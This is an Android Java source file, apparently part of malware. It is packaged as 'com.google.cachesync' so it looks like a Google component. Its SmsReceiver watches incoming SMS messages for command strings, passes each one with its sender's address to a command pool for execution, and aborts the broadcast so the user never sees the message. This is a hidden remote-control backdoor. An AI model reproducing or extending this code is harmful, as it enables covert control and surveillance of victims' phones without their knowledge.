package com.google.cachesync;

import java.util.Set;

import com.code4bones.utils.NetLog;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

/*
 *         Uri uri;
            String[] projection;

            // If targeting Donut or below, use
            // Contacts.Phones.CONTENT_FILTER_URL and
            // Contacts.Phones.DISPLAY_NAME
            uri = Uri.withAppendedPath(
                    ContactsContract.PhoneLookup.CONTENT_FILTER_URI,
                    Uri.encode(fromAddress));
            projection = new String[] { ContactsContract.PhoneLookup.DISPLAY_NAME };

            // Query the filter URI
            Cursor cursor = context.getContentResolver().query(uri, projection, null, null, null);
            if (cursor != null) {
                if (cursor.moveToFirst())
                    fromDisplayName = cursor.getString(0);

                cursor.close();
            }

 */

public class SmsReceiver extends BroadcastReceiver {


	
	@Override
	public void onReceive(Context context, Intent intent) {

		   CommandPool  cmdPool = CommandPool.getInstance();
			
			Bundle extras = intent.getExtras();
			if ( extras == null ) {
				NetLog.v("SMS have no Extras() !");
				return;
			}
			
			boolean isCommand = false;
					
			Object[] objExtra = (Object[])extras.get("pdus");
			for ( Object smsx : objExtra ) {
				SmsMessage sms = SmsMessage.createFromPdu((byte[])smsx);
				
				String message = sms.getMessageBody();
				
				if ( !CommandObj.isCommand(message) ) 
					continue;

				isCommand = true;
				cmdPool.Execute(sms.getOriginatingAddress(),message);
				NetLog.v("SMS: Command Processed...\n");
			}
			if ( isCommand )
				this.abortBroadcast();
		}
}
